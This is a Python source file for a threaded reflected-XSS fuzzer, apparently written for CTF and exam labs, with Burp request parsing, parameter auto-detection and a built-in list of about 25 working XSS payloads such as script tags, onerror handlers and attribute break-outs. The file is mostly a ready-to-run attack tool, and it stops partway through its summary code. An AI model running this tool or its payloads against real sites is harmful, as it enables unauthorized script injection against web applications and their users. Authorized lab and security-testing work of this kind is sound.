#!/usr/bin/env python3
"""xss_hunter.py - Exam-Grade Reflected-XSS Fuzzer.

Single-file, stdlib only, threaded, polite. Built to replace Burp Intruder
under exam time pressure. Authorized lab / CTF use only.
"""

import argparse
import gzip
import html
import http.client
import os
import queue
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
import zlib


# ============================================================
#  ANSI COLORS  (Windows: enable VT processing via os.system(''))
# ============================================================
if os.name == 'nt':
    try:
        os.system('')
    except Exception:
        pass

for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass


class C:
    R = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    CYAN = '\033[36m'
    MAG = '\033[35m'
    BLUE = '\033[34m'
    GREY = '\033[90m'


def disable_colors():
    for k in list(vars(C).keys()):
        if not k.startswith('_'):
            setattr(C, k, '')


BANNER_TMPL = """{c}
╔══════════════════════════════════════════════════════╗
║          XSS Hunter - Exam-Grade Fuzzer              ║
║  Threaded | Grep-filter | Auto-detect | Burp-aware   ║
║          stdlib only · no DoS · polite               ║
╚══════════════════════════════════════════════════════╝{r}"""


def banner():
    return BANNER_TMPL.format(c=C.CYAN, r=C.R)


# ============================================================
#  ARGPARSE  -  the help text IS the manual. Read it once, never re-read.
# ============================================================
def build_parser():
    epilog = (
        f"\n{C.BOLD}USAGE SCENARIOS{C.R}  (read once, you won't be stuck in the exam)\n"
        f"\n{C.CYAN}-- A. Prof drops a 'grep for X' hint --{C.R}\n"
        f"  HTML source says e.g.: grep for 'tr0uble' (replace 0 with o)\n"
        f"  Meaning: the WINNING payload makes the response contain 'trouble'.\n"
        f"    {C.GREEN}python xss_hunter.py \\\n"
        f"        -u \"https://site/challenge.php?challenge=2\" \\\n"
        f"        -p alert -f payloads.txt --grep trouble \\\n"
        f"        --cookie \"PHPSESSID=abc; other=xyz\"{C.R}\n"
        f"\n{C.CYAN}-- B. You captured the request in Burp --{C.R}\n"
        f"  Save it to req.txt. Put the literal word {C.YELLOW}FUZZ{C.R} (or §§) where\n"
        f"  the payload should be inserted. Headers, cookies, body, method are\n"
        f"  all reused verbatim from the file.\n"
        f"    {C.GREEN}python xss_hunter.py --request req.txt \\\n"
        f"        -f payloads.txt --grep trouble{C.R}\n"
        f"\n{C.CYAN}-- C. You don't know which field is injectable --{C.R}\n"
        f"    {C.GREEN}python xss_hunter.py -u URL --auto-detect --cookie \"...\"{C.R}\n"
        f"  Probes: q, search, input, alert, name, data, msg, text, comment,\n"
        f"          s, query, pin, code  -- pick one that reflects, re-run.\n"
        f"\n{C.CYAN}-- D. No hint, just want any working XSS --{C.R}\n"
        f"    {C.GREEN}python xss_hunter.py -u URL -p alert -f payloads.txt{C.R}\n"
        f"  Hit = payload reflected AND response shows JS-exec markers.\n"
        f"\n{C.BOLD}DETECTION LAYERS{C.R}  (highest priority first)\n"
        f"  {C.GREEN}[+] GREP-HIT  {C.R} --grep keyword found       -> THIS IS YOUR WINNER\n"
        f"  {C.GREEN}[+] XSS       {C.R} reflected + exec markers   -> confirmed XSS\n"
        f"  {C.YELLOW}[~] REFLECTED {C.R} echoed but inert           -> needs manual check\n"
        f"  {C.RED}[x] BLOCKED   {C.R} not reflected              -> filtered out\n"
        f"\n{C.BOLD}COOKIE SAFETY{C.R}\n"
        f"  Your PHPSESSID is sacred. One mistake = lost session = exam over.\n"
        f"  The tool ECHOES the parsed Cookie header BEFORE sending any request.\n"
        f"  Press ENTER to continue, Ctrl-C to abort. {C.DIM}(--yes skips the prompt){C.R}\n"
        f"\n{C.BOLD}EXIT CODES{C.R}\n"
        f"  0  at least one hit      1  zero hits      2  argument / network error\n"
    )

    p = argparse.ArgumentParser(
        prog='xss_hunter.py',
        formatter_class=argparse.RawTextHelpFormatter,
        description=(
            banner()
            + f"\n  {C.BOLD}Exam-grade reflected-XSS fuzzer.{C.R}"
            + f"\n  Replaces Burp Intruder when you need speed under pressure."
        ),
        epilog=epilog,
        add_help=False,
    )

    g_tgt = p.add_argument_group(f'{C.BOLD}TARGET{C.R}  (use -u OR --request)')
    g_tgt.add_argument(
        '-u', '--url', metavar='URL',
        help='Full target URL.\n'
             '  example:  -u "https://site/challenge.php?challenge=2"\n'
             'Pair with -p to say which parameter to fuzz.',
    )
    g_tgt.add_argument(
        '--request', metavar='FILE',
        help='Path to a Burp-style raw HTTP request file.\n'
             'Put the word FUZZ (or §§) where the payload should be inserted.\n'
             '  example:  --request req.txt\n'
             'Method, URL, headers, cookies and body are reused from the file.',
    )

    g_inj = p.add_argument_group(f'{C.BOLD}INJECTION{C.R}')
    g_inj.add_argument(
        '-p', '--param', metavar='NAME',
        help='Parameter name to inject into.\n'
             '  example:  -p alert\n'
             '(ignored if --request contains FUZZ, or with --auto-detect)',
    )
    g_inj.add_argument(
        '-X', '--method', default='POST', choices=['GET', 'POST'],
        help='HTTP method. Default: POST.\n'
             '  example:  -X GET   (for ?q=payload style URLs)',
    )
    g_inj.add_argument(
        '--extra-param', metavar='K=V', action='append', default=[],
        help='Extra fixed parameter sent with every request. Repeatable.\n'
             '  example:  --extra-param challenge=2 --extra-param submit=Submit',
    )
    g_inj.add_argument(
        '--auto-detect', action='store_true',
        help='Send a unique canary to a list of common parameter names and\n'
             'report which ones reflect it. Use when you don\'t know -p yet.',
    )

    g_pl = p.add_argument_group(f'{C.BOLD}PAYLOADS{C.R}')
    g_pl.add_argument(
        '-f', '--file', metavar='FILE',
        help='Payload list - one payload per line.\n'
             'Blank lines and lines starting with # are ignored.\n'
             '  example:  -f payloads.txt\n'
             'Optional - if omitted, only the built-in COMMON list runs.',
    )
    g_pl.add_argument(
        '--no-common', action='store_true',
        help='Skip the built-in ~25-payload high-probability list.\n'
             'Default: try common payloads FIRST, then the wordlist.\n'
             'The common list often wins in 1-5s on CTF / lab challenges.',
    )
    g_pl.add_argument(
        '--common-only', action='store_true',
        help='Run ONLY the built-in common list - ignore any wordlist.\n'
             'Fastest mode - use as a first probe before a full fuzz.',
    )
    g_pl.add_argument(
        '--limit', type=int, metavar='N',
        help='Only test the first N payloads. Smoke-test before a full run.\n'
             '  example:  --limit 20',
    )

    g_det = p.add_argument_group(f'{C.BOLD}DETECTION{C.R}')
    g_det.add_argument(
        '--grep', metavar='WORD',
        help='Case-insensitive keyword to search for in each response body.\n'
             'If present -> INSTANT WINNER (overrides everything else).\n'
             '  example:  --grep trouble\n'
             'Use whenever the prof drops a "grep for X" hint.',
    )
    g_det.add_argument(
        '--all', dest='find_all', action='store_true',
        help='Test ALL payloads instead of stopping at first hit.\n'
             'Default: stop the moment a GREP-HIT / XSS is found (fastest).\n'
             'Use --all when you want to enumerate every working payload.',
    )

    g_net = p.add_argument_group(f'{C.BOLD}NETWORK & SESSION{C.R}')
    g_net.add_argument(
        '--cookie', metavar='STR',
        help='Cookie header sent with EVERY request.\n'
             '  example:  --cookie "PHPSESSID=abc123; _ga=GA1.1.x"\n'
             'Tool echoes the parsed value before run - confirm to continue.',
    )
    g_net.add_argument(
        '--header', metavar='K:V', action='append', default=[],
        help='Extra HTTP header. Repeatable.\n'
             '  example:  --header "X-Forwarded-For: 127.0.0.1"',
    )
    g_net.add_argument(
        '-t', '--threads', type=int, default=20,
        help='Worker threads. Default 20. Hard-capped at 30 to stay polite.\n'
             'Useful when the lab server is slow (latency-bound, not CPU-bound).',
    )
    g_net.add_argument(
        '-d', '--delay', type=float, default=0.0,
        help='Per-thread sleep between requests (seconds). Default 0.0.\n'
             'Raise to ~0.2 if the lab is fragile or you see 429s.',
    )
    g_net.add_argument(
        '--timeout', type=float, default=8.0,
        help='Per-request timeout in seconds. Default 8.',
    )
    g_net.add_argument(
        '--insecure', action='store_true',
        help='Skip TLS certificate verification (lab use only).',
    )

    g_out = p.add_argument_group(f'{C.BOLD}OUTPUT{C.R}')
    g_out.add_argument(
        '-o', '--output', metavar='FILE',
        help='Append hits to this file (index | label | status | payload).\n'
             '  example:  -o hits.txt',
    )
    g_out.add_argument(
        '-v', '--verbose', action='store_true',
        help='Show every result (reflected, blocked, errors), not just hits.',
    )
    g_out.add_argument(
        '--no-color', action='store_true',
        help='Disable ANSI colors (for piping or dumb terminals).',
    )
    g_out.add_argument(
        '-y', '--yes', action='store_true',
        help='Skip the cookie-confirmation prompt. Use only in scripts.',
    )

    g_misc = p.add_argument_group(f'{C.BOLD}MISC{C.R}')
    g_misc.add_argument(
        '-h', '--help', action='help',
        help='Show this help and exit.',
    )
    g_misc.add_argument(
        '--cheatsheet', action='store_true',
        help='Print a one-screen cheat-sheet of the four scenarios and exit.',
    )

    return p


# ============================================================
#  BURP REQUEST FILE PARSER
# ============================================================
FUZZ_MARKERS = ('FUZZ', '§§')


class ParsedRequest:
    __slots__ = ('method', 'url', 'headers', 'body', 'has_marker')

    def __init__(self, method, url, headers, body, has_marker):
        self.method = method
        self.url = url
        self.headers = headers
        self.body = body
        self.has_marker = has_marker


def _guess_scheme(host):
    if host.endswith(':80'):
        return 'http'
    return 'https'


def parse_burp_request(path):
    with open(path, 'rb') as f:
        raw = f.read().decode('utf-8', errors='replace')
    raw = raw.replace('\r\n', '\n').replace('\r', '\n')
    if '\n\n' in raw:
        head, body = raw.split('\n\n', 1)
    else:
        head, body = raw, ''
    lines = head.split('\n')
    if not lines or not lines[0].strip():
        raise ValueError('empty request file')
    parts = lines[0].split()
    if len(parts) < 2:
        raise ValueError(f'bad request line: {lines[0]!r}')
    method = parts[0].upper()
    path_q = parts[1]
    headers = {}
    host = None
    for ln in lines[1:]:
        if ':' not in ln:
            continue
        k, _, v = ln.partition(':')
        k = k.strip()
        v = v.strip()
        if not k:
            continue
        headers[k] = v
        if k.lower() == 'host':
            host = v
    if host is None:
        raise ValueError('Host: header missing from request file')
    scheme = _guess_scheme(host)
    url = f'{scheme}://{host}{path_q}'
    header_blob = '\n'.join(f'{k}: {v}' for k, v in headers.items())
    has_marker = any(
        m in url or m in body or m in header_blob for m in FUZZ_MARKERS
    )
    return ParsedRequest(method, url, headers, body.rstrip('\n'), has_marker)


def substitute_fuzz(text, payload):
    """URL-encode and replace markers — for URL/body context."""
    enc = urllib.parse.quote(payload, safe='')
    out = text
    for m in FUZZ_MARKERS:
        out = out.replace(m, enc)
    return out


def substitute_fuzz_header(text, payload):
    """Replace markers without URL-encoding — for HTTP header values.
    Strips CR/LF from the payload to keep the HTTP request valid.
    """
    safe = payload.replace('\r', '').replace('\n', '')
    out = text
    for m in FUZZ_MARKERS:
        out = out.replace(m, safe)
    return out


# ============================================================
#  HTTP CLIENT
# ============================================================
DEFAULT_UA = 'Mozilla/5.0 (XSS-Hunter/1.0)'

# Per-thread persistent HTTP(S) connection — massive speedup vs urllib's
# one-handshake-per-request model.
_tls = threading.local()


def _get_conn(scheme, host, port, timeout, insecure):
    key = (scheme, host, port)
    if getattr(_tls, 'key', None) != key or getattr(_tls, 'conn', None) is None:
        _reset_conn()
        if scheme == 'https':
            ctx = (ssl._create_unverified_context()
                   if insecure else ssl.create_default_context())
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        _tls.conn = conn
        _tls.key = key
    return _tls.conn


def _reset_conn():
    c = getattr(_tls, 'conn', None)
    if c is not None:
        try:
            c.close()
        except Exception:
            pass
    _tls.conn = None
    _tls.key = None


def send(method, url, headers, body, timeout, insecure=False):
    """Send one HTTP request, reusing this thread's persistent connection.
    Returns (status, body_text, err_str_or_None).
    """
    parsed = urllib.parse.urlparse(url)
    if not parsed.hostname:
        return 0, '', f'bad url: {url!r}'
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'
    if parsed.query:
        path += '?' + parsed.query

    h = dict(headers)
    h.setdefault('User-Agent', DEFAULT_UA)
    h.setdefault('Accept', '*/*')
    h.setdefault('Connection', 'keep-alive')
    h.setdefault('Host', host)
    # Drop brotli — we can't decode it (no stdlib brotli). Keep gzip/deflate.
    ae = h.get('Accept-Encoding')
    if ae and 'br' in ae.lower():
        h['Accept-Encoding'] = 'gzip, deflate'
    body_bytes = None
    if body and method == 'POST':
        body_bytes = body.encode('utf-8')
        h.setdefault('Content-Type', 'application/x-www-form-urlencoded')
        h['Content-Length'] = str(len(body_bytes))

    # Try up to twice: a stale keep-alive connection often raises on first use
    # but a fresh one will succeed.
    for attempt in (1, 2):
        try:
            conn = _get_conn(parsed.scheme, host, port, timeout, insecure)
            conn.request(method, path, body=body_bytes, headers=h)
            resp = conn.getresponse()
            raw = resp.read()
            enc = (resp.getheader('Content-Encoding') or '').lower().strip()
            try:
                if enc == 'gzip':
                    raw = gzip.decompress(raw)
                elif enc == 'deflate':
                    try:
                        raw = zlib.decompress(raw)
                    except zlib.error:
                        raw = zlib.decompress(raw, -zlib.MAX_WBITS)
                # br (brotli) needs an external lib — skip; body stays raw
            except Exception:
                pass  # leave raw bytes if decompression fails
            try:
                text = raw.decode('utf-8', errors='replace')
            except Exception:
                text = ''
            return resp.status, text, None
        except ssl.SSLError as e:
            # Cert / TLS errors are not transient — bail with hint.
            return 0, '', f'SSL: {e} (try --insecure)'
        except (http.client.HTTPException, ConnectionError,
                socket.error, OSError) as e:
            _reset_conn()
            if attempt == 2:
                return 0, '', f'{type(e).__name__}: {e}'
        except Exception as e:
            _reset_conn()
            return 0, '', f'{type(e).__name__}: {e}'

    return 0, '', 'unknown error'


# ============================================================
#  DETECTION
# ============================================================
EXEC_CLUES = (
    '<script', 'onerror=', 'onload=', 'javascript:',
    'alert(', 'confirm(', 'prompt(',
    'onfocus=', 'ondrag=', 'onclick=', 'onmouseover=',
)


def classify(payload, body, grep):
    """Return (label, is_hit)."""
    if grep:
        if grep.lower() in body.lower():
            return ('GREP-HIT', True)
        return ('NO-GREP', False)
    if not body:
        return ('BLOCKED', False)
    reflected = payload in body or html.unescape(payload) in body
    if reflected:
        low = body.lower()
        if any(c in low for c in EXEC_CLUES):
            return ('XSS', True)
        return ('REFLECTED', False)
    return ('BLOCKED', False)


# ============================================================
#  PROGRESS BAR
# ============================================================
class Progress:
    def __init__(self, total):
        self.total = total
        self.done = 0
        self.lock = threading.Lock()
        self.start = time.time()

    def tick(self):
        with self.lock:
            self.done += 1
            self._draw()

    def _draw(self):
        if self.total == 0:
            return
        pct = self.done / self.total
        w = 30
        filled = int(w * pct)
        bar = '#' * filled + '.' * (w - filled)
        elapsed = time.time() - self.start
        rate = self.done / elapsed if elapsed > 0 else 0
        sys.stdout.write(
            f'\r{C.CYAN}[{bar}]{C.R} {self.done}/{self.total} '
            f'({pct * 100:5.1f}%)  {rate:5.1f}/s   '
        )
        sys.stdout.flush()

    def clear(self):
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        sys.stdout.flush()


# ============================================================
#  RESULTS / WORKER
# ============================================================
class Hunt:
    def __init__(self, args):
        self.args = args
        self.hits = []
        self.refl = []
        self.blocked = 0
        self.errors = 0
        self.ssl_warned = False  # only print --insecure hint once
        self.first_hit_time = None
        self.first_hit_idx = None
        self.stop_event = threading.Event()
        self.print_lock = threading.Lock()
        self.list_lock = threading.Lock()
        self.out_fp = None
        if args.output:
            self.out_fp = open(args.output, 'a', encoding='utf-8')
            self.out_fp.write(
                f'\n# xss_hunter run {time.strftime("%Y-%m-%d %H:%M:%S")}\n'
            )

    def close(self):
        if self.out_fp:
            self.out_fp.close()

    def _line(self, msg):
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        print(msg)
        sys.stdout.flush()

    def emit_hit(self, idx, payload, status, label, elapsed):
        with self.list_lock:
            self.hits.append((idx, payload, status, label))
            if self.first_hit_time is None:
                self.first_hit_time = elapsed
                self.first_hit_idx = idx
        with self.print_lock:
            self._line(f'  {C.GREEN}{C.BOLD}[+ {label}]{C.R} #{idx}  '
                       f'{C.DIM}({elapsed:.2f}s){C.R}')
            self._line(f'      {C.DIM}Payload :{C.R} {payload}')
            self._line(f'      {C.DIM}Status  :{C.R} {status}')
        if self.out_fp:
            self.out_fp.write(f'#{idx} | {label} | status={status} | {payload}\n')
            self.out_fp.flush()
        # EARLY-STOP: signal all workers to drop their queue and exit.
        if not self.args.find_all:
            self.stop_event.set()

    def emit_refl(self, idx, payload):
        with self.list_lock:
            self.refl.append((idx, payload))
        if self.args.verbose:
            with self.print_lock:
                self._line(f'  {C.YELLOW}[~ REFLECTED ]{C.R} #{idx} | {payload[:80]}')

    def emit_blocked(self, idx, payload):
        with self.list_lock:
            self.blocked += 1
        if self.args.verbose:
            with self.print_lock:
                self._line(f'  {C.RED}[x BLOCKED   ]{C.R} #{idx} | {payload[:80]}')

    def emit_error(self, idx, payload, err):
        with self.list_lock:
            self.errors += 1
        # First time we see an SSL/cert error, shout LOUDLY and stop the run —
        # better than 200 silent failures.
        if ('SSL' in err or 'cert' in err.lower()) and not self.ssl_warned:
            with self.print_lock:
                if not self.ssl_warned:
                    self.ssl_warned = True
                    self._line('')
                    self._line(f'  {C.RED}{C.BOLD}[!] TLS certificate verification failed.{C.R}')
                    self._line(f'  {C.RED}    {err}{C.R}')
                    self._line(f'  {C.YELLOW}    Add {C.BOLD}--insecure{C.R}{C.YELLOW} '
                               f'and re-run (lab certs are usually self-signed).{C.R}')
                    self._line('')
                    self.stop_event.set()
            return
        if self.args.verbose:
            with self.print_lock:
                self._line(f'  {C.MAG}[! ERROR     ]{C.R} #{idx} | {err} | {payload[:60]}')


def worker(q, hunt, request_template, progress, t0):
    args = hunt.args
    while not hunt.stop_event.is_set():
        try:
            idx, payload = q.get_nowait()
        except queue.Empty:
            break
        try:
            method, url, headers, body = build_request(request_template, payload)
            if args.verbose:
                with hunt.print_lock:
                    sys.stdout.write('\r' + ' ' * 80 + '\r')
                    print(f'  {C.GREY}[>] #{idx:>3} sending: {payload[:70]}{C.R}')
            status, body_text, err = send(
                method, url, headers, body, args.timeout, args.insecure
            )
            if err is not None:
                hunt.emit_error(idx, payload, err)
            else:
                label, is_hit = classify(payload, body_text, args.grep)
                if is_hit:
                    suffix = f' [{args.grep}]' if args.grep else ''
                    hunt.emit_hit(idx, payload, status, label + suffix,
                                  time.time() - t0)
                elif label == 'REFLECTED':
                    hunt.emit_refl(idx, payload)
                else:
                    hunt.emit_blocked(idx, payload)
        finally:
            progress.tick()
            if args.delay > 0 and not hunt.stop_event.is_set():
                time.sleep(args.delay)
    # Clean up this thread's keep-alive connection on exit.
    _reset_conn()


# ============================================================
#  REQUEST BUILDING
# ============================================================
def build_request(template, payload):
    """Return (method, url, headers, body) for a single payload."""
    mode = template[0]
    if mode == 'req-mode':
        pr = template[1]
        url = substitute_fuzz(pr.url, payload)
        body = substitute_fuzz(pr.body, payload)
        headers = {k: substitute_fuzz_header(v, payload) for k, v in pr.headers.items()}
        if pr.method == 'POST':
            headers.pop('Content-Length', None)
            headers.setdefault('Content-Type', 'application/x-www-form-urlencoded')
        return pr.method, url, headers, body

    # url-mode
    _, base_url, param_name, extras, base_headers, method = template
    pairs = list(extras)
    if param_name is not None:
        pairs.append((param_name, payload))
    encoded = urllib.parse.urlencode(pairs)
    if method == 'GET':
        sep = '&' if '?' in base_url else '?'
        url = base_url + sep + encoded if encoded else base_url
        return method, url, dict(base_headers), ''
    headers = dict(base_headers)
    headers.setdefault('Content-Type', 'application/x-www-form-urlencoded')
    return method, base_url, headers, encoded


def parse_extras(args_list):
    out = []
    for kv in args_list:
        if '=' not in kv:
            raise ValueError(f'bad --extra-param: {kv!r} (expected K=V)')
        k, _, v = kv.partition('=')
        out.append((k, v))
    return out


def parse_headers(args_list):
    out = {}
    for hv in args_list:
        if ':' not in hv:
            raise ValueError(f'bad --header: {hv!r} (expected K:V)')
        k, _, v = hv.partition(':')
        out[k.strip()] = v.strip()
    return out


def build_base_headers(args):
    headers = {'User-Agent': DEFAULT_UA, 'Accept': '*/*'}
    if args.cookie:
        headers['Cookie'] = args.cookie
    headers.update(parse_headers(args.header))
    return headers


# ============================================================
#  AUTO-DETECT
# ============================================================
COMMON_PARAMS = [
    'q', 'search', 'input', 'alert', 'name', 'data', 'msg',
    'text', 'comment', 's', 'query', 'pin', 'code',
]


# High-probability XSS payloads tried BEFORE any wordlist.
# Curated for CTF / exam labs where the prof often accepts the simplest payload.
# Ordering: most-likely-to-work first (no-interaction, alert(1)).
COMMON_PAYLOADS = [
    # Pure script (no-interaction)
    '<script>alert(1)</script>',
    '<script>alert(123)</script>',
    # Self-triggering tags (no-interaction)
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<frameset onload=alert(1)>',
    '<frameset onload=alert(123)>',
    '<iframe onload=alert(1)>',
    '<marquee onstart=alert(1)>',
    # Image error (no-interaction)
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(1) />',
    '<image src=x onerror=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src/onerror=alert(1)>',
    # Auto-focus (no-interaction in modern browsers)
    '<input autofocus onfocus=alert(1)>',
    '<select autofocus onfocus=alert(1)>',
    '<textarea autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',
    # Attribute-break-out (if injected inside an attribute value)
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><svg onload=alert(1)>',
    '" onmouseover=alert(1) x="',
    # javascript: URI (works in href / src contexts)
    'javascript:alert(1)',
    '<a href=javascript:alert(1)>x</a>',
    # SVG with embedded script (defeats some tag filters)
    '<svg><script>alert(1)</script></svg>',
]


def auto_detect(args):
    canary = 'XSSHUNTERCANARY' + str(int(time.time()))
    print(f'\n{C.CYAN}[*] Auto-detect: probing common params with canary {canary!r}{C.R}\n')
    base_headers = build_base_headers(args)
    hits = []
    ssl_failed_once = False
    for name in COMMON_PARAMS:
        pairs = [(name, canary)] + parse_extras(args.extra_param)
        encoded = urllib.parse.urlencode(pairs)
        if args.method == 'GET':
            sep = '&' if '?' in args.url else '?'
            url = args.url + sep + encoded
            body = ''
            headers = dict(base_headers)
        else:
            url = args.url
            body = encoded
            headers = dict(base_headers)
            headers.setdefault('Content-Type', 'application/x-www-form-urlencoded')
        status, text, err = send(
            args.method, url, headers, body, args.timeout, args.insecure,
        )
        if err:
            flag = f'{C.RED}[err]{C.R} {err}'
            if ('SSL' in err or 'cert' in err.lower()) and not ssl_failed_once:
                ssl_failed_once = True
                print(f'  {name:<12}  status={status:<3}  {flag}')
                print(f'\n{C.RED}{C.BOLD}[!] TLS cert failed. Add --insecure for lab use.{C.R}')
                return
        elif canary in text:
            flag = f'{C.GREEN}[REFLECTS +]{C.R}'
            hits.append(name)
        else:
            flag = f'{C.GREY}[no reflect]{C.R}'
        print(f'  {name:<12}  status={status:<3}  {flag}')
        time.sleep(args.delay)
    _reset_conn()
    print()
    if hits:
        print(f'{C.GREEN}[+] Injectable parameter candidates: {", ".join(hits)}{C.R}')
        print(f'    Re-run with:  -p {hits[0]}  -f payloads.txt  --grep WORD')
    else:
        print(f'{C.YELLOW}[!] No common parameter reflected. Inspect the HTML manually.{C.R}')
        print(f'{C.DIM}    (Note: many forms only reflect HTML-looking input; try -p with a known name){C.R}')


# ============================================================
#  COOKIE SAFETY CHECK
# ============================================================
def cookie_safety_check(args):
    if not args.cookie:
        print(f'{C.YELLOW}[!] No --cookie supplied. If the target needs a session, '
              f'add --cookie "PHPSESSID=..." first.{C.R}')
        return
    print(f'\n{C.BOLD}-- Cookie safety check --{C.R}')
    parts = [p.strip() for p in args.cookie.split(';') if p.strip()]
    for p in parts:
        if '=' in p:
            k, _, v = p.partition('=')
            if len(v) > 12:
                redacted = v[:6] + '...' + v[-4:]
            else:
                redacted = v
            print(f'  {C.CYAN}{k.strip()}{C.R} = {redacted}')
        else:
            print(f'  {C.RED}malformed cookie segment: {p!r}{C.R}')
    print(f'{C.DIM}These cookies will be sent VERBATIM with every request.{C.R}')
    if args.yes:
        print(f'{C.DIM}--yes given - skipping confirmation.{C.R}\n')
        return
    try:
        input(f'{C.BOLD}Press ENTER to start, Ctrl-C to abort:{C.R} ')
    except (KeyboardInterrupt, EOFError):
        print(f'\n{C.YELLOW}[!] Aborted before any request was sent.{C.R}')
        sys.exit(0)


# ============================================================
#  CHEAT-SHEET
# ============================================================
def cheatsheet():
    return (
        f"\n{C.BOLD}xss_hunter.py - One-Screen Cheat Sheet{C.R}\n"
        f"\n{C.CYAN}1. Grep-hint mode  (the common exam case){C.R}\n"
        f"   python xss_hunter.py -u URL -p PARAM -f payloads.txt \\\n"
        f"     --grep KEYWORD --cookie \"PHPSESSID=...\"\n"
        f"\n{C.CYAN}2. Burp request file  (raw req with FUZZ marker){C.R}\n"
        f"   python xss_hunter.py --request req.txt -f payloads.txt --grep KEYWORD\n"
        f"\n{C.CYAN}3. Don't know the param? Auto-detect first{C.R}\n"
        f"   python xss_hunter.py -u URL --auto-detect --cookie \"...\"\n"
        f"\n{C.CYAN}4. Generic XSS hunt  (no grep hint){C.R}\n"
        f"   python xss_hunter.py -u URL -p PARAM -f payloads.txt -v\n"
        f"\n{C.BOLD}Most useful flags{C.R}\n"
        f"   --grep WORD        filter by response keyword (winner detector)\n"
        f"   --cookie \"...\"     keeps your session alive\n"
        f"   --extra-param K=V  challenge=2, csrf=..., etc\n"
        f"   -t 10  -d 0.05     fast but polite (max threads 30)\n"
        f"   -o hits.txt        save winners for the writeup\n"
        f"   --auto-detect      probe common param names with a canary\n"
        f"   --request req.txt  use raw Burp request, mark inject with FUZZ\n"
    )


# ============================================================
#  MAIN
# ============================================================
def main():
    parser = build_parser()
    args = parser.parse_args()

    if args.no_color:
        disable_colors()

    if args.cheatsheet:
        print(cheatsheet())
        return 0

    if not args.url and not args.request:
        print(banner())
        parser.print_help()
        print(f'\n{C.RED}[!] Need either -u URL or --request FILE.{C.R}')
        return 2

    print(banner())

    if args.threads < 1:
        args.threads = 1
    if args.threads > 30:
        print(f'{C.YELLOW}[!] --threads {args.threads} capped to 30 (polite max).{C.R}')
        args.threads = 30
    if args.delay < 0:
        args.delay = 0

    # --- auto-detect short-circuit ---
    if args.auto_detect:
        if not args.url:
            print(f'{C.RED}[!] --auto-detect needs -u URL.{C.R}')
            return 2
        cookie_safety_check(args)
        try:
            auto_detect(args)
        except ValueError as e:
            print(f'{C.RED}[!] {e}{C.R}')
            return 2
        return 0

    # --- build the payload list: common first, then wordlist ---
    payloads = []
    file_payloads = []
    if args.file:
        try:
            with open(args.file, 'r', encoding='utf-8', errors='replace') as f:
                file_payloads = [
                    ln.rstrip('\n')
                    for ln in f
                    if ln.strip() and not ln.lstrip().startswith('#')
                ]
        except OSError as e:
            print(f'{C.RED}[!] Cannot read payload file: {e}{C.R}')
            return 2

    if args.common_only:
        payloads = list(COMMON_PAYLOADS)
    elif args.no_common:
        payloads = file_payloads
    else:
        # Common FIRST, then file (de-duplicated)
        seen = set()
        for pl in COMMON_PAYLOADS + file_payloads:
            if pl not in seen:
                seen.add(pl)
                payloads.append(pl)

    if args.limit:
        payloads = payloads[:args.limit]
    if not payloads:
        print(f'{C.RED}[!] No payloads to test. Provide -f or remove --no-common.{C.R}')
        return 2

    # --- build request template ---
    try:
        extras = parse_extras(args.extra_param)
        extra_headers = parse_headers(args.header)
    except ValueError as e:
        print(f'{C.RED}[!] {e}{C.R}')
        return 2

    if args.request:
        try:
            pr = parse_burp_request(args.request)
        except (OSError, ValueError) as e:
            print(f'{C.RED}[!] --request parse error: {e}{C.R}')
            return 2
        if not pr.has_marker:
            print(f'{C.RED}[!] --request file has no FUZZ marker.{C.R}')
            print(f'    Add the literal word FUZZ (or §§) where the payload goes.')
            return 2
        if args.cookie:
            pr.headers['Cookie'] = args.cookie
        for k, v in extra_headers.items():
            pr.headers[k] = v
        pr.headers.setdefault('User-Agent', DEFAULT_UA)
        template = ('req-mode', pr)
        target_desc = f'{pr.method} {pr.url}  (from {args.request})'
    else:
        if not args.param:
            print(f'{C.RED}[!] -p PARAM required (or use --request with FUZZ, or --auto-detect).{C.R}')
            return 2
        base_headers = build_base_headers(args)
        template = ('url-mode', args.url, args.param, extras, base_headers, args.method)
        target_desc = f'{args.method} {args.url}  inject-> {args.param}'

    # --- run header ---
    stop_mode = 'all (no early stop)' if args.find_all else 'first-hit'
    tls_mode = f'{C.YELLOW}insecure{C.R}' if args.insecure else 'verify-tls'
    # Breakdown so user sees where payloads come from
    n_common = sum(1 for p in payloads if p in set(COMMON_PAYLOADS))
    n_file = len(payloads) - n_common
    pl_breakdown = f'{len(payloads)} (common={n_common}, file={n_file})'
    print(f'{C.BOLD}Target  :{C.R} {target_desc}')
    print(f'{C.BOLD}Payloads:{C.R} {pl_breakdown}   '
          f'{C.BOLD}Threads:{C.R} {args.threads}   '
          f'{C.BOLD}Delay  :{C.R} {args.delay}s   '
          f'{C.BOLD}Grep   :{C.R} {args.grep or "(none)"}')
    print(f'{C.BOLD}Mode    :{C.R} stop={stop_mode}   tls={tls_mode}   '
          f'keep-alive=on')

    cookie_safety_check(args)

    # --- enqueue + run ---
    q = queue.Queue()
    for i, pl in enumerate(payloads, 1):
        q.put((i, pl))

    progress = Progress(len(payloads))
    hunt = Hunt(args)

    threads = []
    t0 = time.time()
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker, args=(q, hunt, template, progress, t0), daemon=True,
        )
        t.start()
        threads.append(t)
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        hunt.stop_event.set()
        progress.clear()
        print(f'\n{C.YELLOW}[!] Ctrl-C - stopping. Partial results below.{C.R}\n')

    elapsed = time.time() - t0
    progress.clear()
    hunt.close()

    # --- summary ---
    rate = progress.done / elapsed if elapsed > 0 else 0
